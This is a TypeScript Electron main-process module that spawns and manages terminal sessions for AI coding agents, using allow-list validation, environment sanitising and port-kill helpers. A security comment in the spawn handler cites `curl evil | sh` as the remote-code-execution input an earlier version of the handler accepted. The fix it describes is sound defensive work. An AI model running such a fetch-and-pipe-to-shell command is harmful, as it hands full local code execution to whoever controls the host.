import type { IpcMain, BrowserWindow } from "electron";
import log from "electron-log/main";
import * as os from "node:os";
import * as fs from "node:fs";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { installAgentHooks } from "./agent-hooks";
import { IPC } from "./ipc-channels";
import { safeHandle } from "./ipc-safe-handle";
import {
  resolveCommandOnPath,
  resolveShell,
  sanitizedProcessEnv,
  shellArgsForCommand,
} from "./shell-env";
import { loadProjectRoots } from "./project-roots";
import {
  resolveSpawnPlan,
  SpawnPolicyError,
  type SpawnRequest,
} from "./pty-spawn-policy";

function sanitizeEnv(): Record<string, string> {
  const out = sanitizedProcessEnv();
  // The PTY is xterm.js, not whichever terminal launched Electron. Leaking
  // TERM_PROGRAM=ghostty (or iTerm.app, etc.) makes Claude Code take terminal-
  // specific code paths that don't match what we actually emit — e.g. it skips
  // installing the Shift+Enter keybinding when it thinks Ghostty is handling it
  // natively, but xterm.js sends `\x1b\r` (the iTerm sequence) instead of LF.
  delete out.TERM_PROGRAM;
  delete out.TERM_PROGRAM_VERSION;
  return out;
}

// Claude Code only treats ESC+CR (`\x1b\r`, what `terminal-keymap.ts` emits for
// Shift+Enter) as "insert newline" when this flag is set. Normally `/terminal-
// setup` writes it; do it eagerly so the user doesn't have to.
function ensureClaudeShiftEnterBinding(): void {
  try {
    const dir = path.join(os.homedir(), ".claude");
    const file = path.join(dir, "settings.json");
    let settings: Record<string, unknown> = {};
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, "utf8");
      if (raw.trim()) settings = JSON.parse(raw);
    }
    if (settings.shiftEnterKeyBindingInstalled === true) return;
    settings.shiftEnterKeyBindingInstalled = true;
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(file, JSON.stringify(settings, null, 2) + "\n", "utf8");
  } catch {
    // best-effort — user can still run `/terminal-setup` manually.
  }
}

type Pty = {
  id: string;
  taskId: string;
  proc: any;
  buffer: string[];
  bufferBytes: number;
  cwd: string;
  command: string;
  agent?: string;
  mcEnv?: { apiUrl?: string; token?: string };
  scanTail: string;
  lastInterruptAt: number;
};

const INTERRUPT_COOLDOWN_MS = 2000;
const SCAN_TAIL_MAX = 256;

const MAX_TCP_PORT = 65535;
const LSOF_PROBE_TIMEOUT_MS = 2_000;
// Time we'll wait for SIGTERM to take before escalating to SIGKILL (port-kill)
// or before giving up the wait (pty kill). Same grace for both: 1.5s.
const SIGTERM_GRACE_MS = 1_500;
const PORT_KILL_POLL_INTERVAL_MS = 100;
const PTY_EXIT_POLL_INTERVAL_MS = 50;
const DEFAULT_PTY_COLS = 100;
const DEFAULT_PTY_ROWS = 30;

export function hasClaudeInterruptPrompt(text: string): boolean {
  return (
    text.includes("Interrupted by user") ||
    (text.includes("Interrupted") &&
      text.includes("What should Claude do instead"))
  );
}

export function hasCodexHookReviewPrompt(text: string): boolean {
  const normalized = text.replace(/\s+/g, " ").toLowerCase();
  return (
    normalized.includes("hooks need review before they can run") ||
    normalized.includes("open /hooks to review")
  );
}

function scanTail(p: Pty, chunk: string): string {
  const haystack = (p.scanTail + chunk).slice(-SCAN_TAIL_MAX - chunk.length);
  p.scanTail = haystack.slice(-SCAN_TAIL_MAX);
  return haystack;
}

function scanForInterrupt(p: Pty, haystack: string) {
  if (p.agent !== "claude-code") return;
  if (!p.mcEnv?.apiUrl || !p.mcEnv?.token) return;
  if (!hasClaudeInterruptPrompt(haystack)) return;
  const now = Date.now();
  if (now - p.lastInterruptAt < INTERRUPT_COOLDOWN_MS) return;
  p.lastInterruptAt = now;
  void postSyntheticHook(p, "UserInterrupt");
}

function scanForCodexHookReview(p: Pty, haystack: string) {
  if (p.agent !== "codex") return;
  if (!p.mcEnv?.apiUrl || !p.mcEnv?.token) return;
  if (!hasCodexHookReviewPrompt(haystack)) return;
  void postSyntheticHook(p, "PermissionRequest");
}

function hookEndpointSlug(agent: string | undefined): string {
  if (agent === "codex") return "codex";
  if (agent === "cursor-cli") return "cursor";
  return "claude";
}

async function postSyntheticHook(p: Pty, event: string) {
  try {
    const slug = hookEndpointSlug(p.agent);
    const url = `${p.mcEnv!.apiUrl}/api/hooks/${slug}?taskId=${encodeURIComponent(p.taskId)}`;
    await fetch(url, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${p.mcEnv!.token}`,
      },
      body: JSON.stringify({ hook_event_name: event }),
    });
  } catch {
    /* swallow — best-effort status sync */
  }
}

const ptys = new Map<string, Pty>();
const RING_LIMIT_BYTES = 1_000_000;

type PortKillResult = {
  port: number;
  pids: number[];
  killed: number[];
  errors: string[];
};

let nodePty: typeof import("node-pty") | null = null;
function loadNodePty() {
  if (!nodePty) {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    nodePty = require("node-pty");
  }
  return nodePty!;
}

function appendBuffer(p: Pty, chunk: string) {
  p.buffer.push(chunk);
  p.bufferBytes += Buffer.byteLength(chunk, "utf8");
  while (p.bufferBytes > RING_LIMIT_BYTES && p.buffer.length > 1) {
    const dropped = p.buffer.shift()!;
    p.bufferBytes -= Buffer.byteLength(dropped, "utf8");
  }
}

function send(getWin: () => BrowserWindow | null, channel: string, payload: any) {
  const win = getWin();
  if (!win || win.isDestroyed()) return;
  win.webContents.send(channel, payload);
}

function normalizedCommand(command: string): string {
  return command.trim();
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function pidsListeningOnPort(port: number): number[] {
  if (!Number.isInteger(port) || port <= 0 || port > MAX_TCP_PORT) return [];
  if (os.platform() === "win32") return [];

  const result = spawnSync("lsof", ["-nP", `-tiTCP:${port}`, "-sTCP:LISTEN"], {
    encoding: "utf8",
    timeout: LSOF_PROBE_TIMEOUT_MS,
  });
  if (result.error || result.status !== 0) return [];

  const pids = (result.stdout || "")
    .split(/\s+/)
    .map((raw) => Number(raw))
    .filter((pid) => Number.isInteger(pid) && pid > 0 && pid !== process.pid);
  return [...new Set(pids)];
}

async function killPidsListeningOnPort(port: number): Promise<PortKillResult> {
  const pids = pidsListeningOnPort(port);
  const killed: number[] = [];
  const errors: string[] = [];

  for (const pid of pids) {
    try {
      process.kill(pid, "SIGTERM");
      killed.push(pid);
    } catch (err: any) {
      errors.push(`pid ${pid}: ${err?.message ?? String(err)}`);
    }
  }

  if (killed.length > 0) {
    const deadline = Date.now() + SIGTERM_GRACE_MS;
    while (Date.now() < deadline && pidsListeningOnPort(port).some((pid) => killed.includes(pid))) {
      await sleep(PORT_KILL_POLL_INTERVAL_MS);
    }
    for (const pid of pidsListeningOnPort(port).filter((pid) => killed.includes(pid))) {
      try {
        process.kill(pid, "SIGKILL");
      } catch {
        /* already exited or not permitted */
      }
    }
  }

  return { port, pids, killed, errors };
}

async function killPty(p: Pty): Promise<boolean> {
  let exited = false;
  try {
    const sub = p.proc.onExit(() => {
      exited = true;
    });
    p.proc.kill();
    const deadline = Date.now() + SIGTERM_GRACE_MS;
    while (!exited && Date.now() < deadline) {
      await sleep(PTY_EXIT_POLL_INTERVAL_MS);
    }
    sub?.dispose?.();
    return true;
  } catch {
    return false;
  } finally {
    ptys.delete(p.id);
  }
}

export function registerPtyHandlers(ipcMain: IpcMain, getWin: () => BrowserWindow | null) {
  ensureClaudeShiftEnterBinding();
  safeHandle(
    IPC.ptySpawn,
    (_evt, opts: SpawnRequest) => {
      const pty = loadNodePty();
      const platform = os.platform();

      // Validate cwd, agent allow-list, and command shape BEFORE spawning. The
      // pre-fix handler joined `command + args` into a shell string and handed
      // it to `sh -l -c`, which made `pty:spawn` a direct RCE primitive — a
      // briefly-compromised renderer could pass `curl evil | sh` as `command`
      // and get full local execution. The policy module rejects anything that
      // isn't an allow-listed agent binary spawned with a clean argv array, or
      // an explicitly opted-in user-shell terminal confined to a project root.
      let plan: ReturnType<typeof resolveSpawnPlan>;
      try {
        plan = resolveSpawnPlan(opts, {
          projectRoots: loadProjectRoots,
          resolveCommand: (name) => resolveCommandOnPath(name, sanitizedProcessEnv()),
          resolveShell: () => ({
            shell: resolveShell(),
            shellArgs: (cmd) => shellArgsForCommand(resolveShell(), cmd, platform),
          }),
        });
      } catch (err) {
        if (err instanceof SpawnPolicyError) {
          // User-reportable failures end up as a single line in `term.writeln`
          // on the renderer; a main-side log keeps the rejection code, the
          // requesting agent, and the cwd available when a user files a "spawn
          // failed" report, without echoing the agent's argv (which may carry
          // session ids the user wouldn't want in a paste).
          log.warn("pty.spawn.rejected", {
            code: err.code,
            agent: opts.agent ?? null,
            shell: opts.shell === true,
            cwd: opts.cwd,
            taskId: opts.taskId,
          });
          throw new Error(`pty:spawn rejected (${err.code}): ${err.message}`);
        }
        throw err;
      }

      // Use the canonical cwd from the plan, not the original request, so a
      // symlink-swap race between validation and spawn can't move us into a
      // post-validation target outside the project root.
      installAgentHooks(opts.agent, plan.cwd);

      const env = sanitizeEnv();
      env.MC_TASK_ID = opts.taskId;
      if (opts.mcEnv?.apiUrl) env.MC_API_URL = opts.mcEnv.apiUrl;
      if (opts.mcEnv?.token) env.MC_API_TOKEN = opts.mcEnv.token;

      // Agent mode spawns the binary directly with a real argv array, bypassing
      // the login shell entirely so shell metacharacters in args can't be
      // re-parsed. Shell mode keeps the `sh -l -c` path for user-driven shell
      // terminals where command interpretation IS the feature.
      const spawnTarget = plan.mode === "agent" ? plan.binary : plan.shellPath;
      const spawnArgs = plan.mode === "agent" ? plan.argv : plan.shellArgs;

      let proc: import("node-pty").IPty;
      try {
        proc = pty.spawn(spawnTarget, spawnArgs, {
          name: "xterm-256color",
          cols: opts.cols ?? DEFAULT_PTY_COLS,
          rows: opts.rows ?? DEFAULT_PTY_ROWS,
          cwd: plan.cwd,
          env,
        });
      } catch (err: any) {
        const msg = err?.message ?? String(err);
        if (msg.includes("posix_spawnp")) {
          throw new Error(
            `posix_spawnp failed for target="${spawnTarget}" cwd="${plan.cwd}". ` +
              `Verify the binary exists and the cwd is a readable directory. ` +
              `Original: ${msg}`
          );
        }
        throw err;
      }

      const id = `pty-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
      const p: Pty = {
        id,
        taskId: opts.taskId,
        proc,
        buffer: [],
        bufferBytes: 0,
        cwd: opts.cwd,
        command: opts.command,
        agent: opts.agent,
        mcEnv: opts.mcEnv,
        scanTail: "",
        lastInterruptAt: 0,
      };
      ptys.set(id, p);

      proc.onData((data: string) => {
        appendBuffer(p, data);
        const haystack = scanTail(p, data);
        scanForInterrupt(p, haystack);
        scanForCodexHookReview(p, haystack);
        send(getWin, IPC.ptyData, { ptyId: id, data });
      });
      proc.onExit(({ exitCode, signal }: { exitCode: number; signal?: number }) => {
        send(getWin, IPC.ptyExit, { ptyId: id, exitCode, signal });
        ptys.delete(id);
      });

      return { ptyId: id };
    },
    ipcMain,
  );

  safeHandle(IPC.ptyWrite, (_evt, { ptyId, data }: { ptyId: string; data: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return false;
    p.proc.write(data);
    return true;
  }, ipcMain);

  safeHandle(
    IPC.ptyResize,
    (_evt, { ptyId, cols, rows }: { ptyId: string; cols: number; rows: number }) => {
      const p = ptys.get(ptyId);
      if (!p) return false;
      try {
        p.proc.resize(cols, rows);
      } catch {
        /* swallow */
      }
      return true;
    },
    ipcMain,
  );

  safeHandle(IPC.ptyKill, (_evt, { ptyId }: { ptyId: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return false;
    try {
      p.proc.kill();
    } catch {
      /* swallow */
    }
    ptys.delete(ptyId);
    return true;
  }, ipcMain);

  safeHandle(
    IPC.ptyKillLaunchProcesses,
    async (
      _evt,
      opts: { cwd: string; commands: string[]; ports?: number[] }
    ): Promise<{ ptyCount: number; ports: PortKillResult[] }> => {
      const wanted = new Set((opts.commands ?? []).map(normalizedCommand).filter(Boolean));
      const targets = [...ptys.values()].filter(
        (p) => p.cwd === opts.cwd && wanted.has(normalizedCommand(p.command))
      );
      await Promise.all(targets.map((p) => killPty(p)));

      const ports = [...new Set(opts.ports ?? [])].filter(
        (port) => Number.isInteger(port) && port > 0 && port <= MAX_TCP_PORT
      );
      const portResults = await Promise.all(ports.map((port) => killPidsListeningOnPort(port)));
      return { ptyCount: targets.length, ports: portResults };
    },
    ipcMain,
  );

  safeHandle(IPC.ptyReplay, (_evt, { ptyId }: { ptyId: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return "";
    return p.buffer.join("");
  }, ipcMain);
}

export function killAllPtys() {
  for (const p of ptys.values()) {
    try {
      p.proc.kill();
    } catch {
      /* swallow */
    }
  }
  ptys.clear();
}
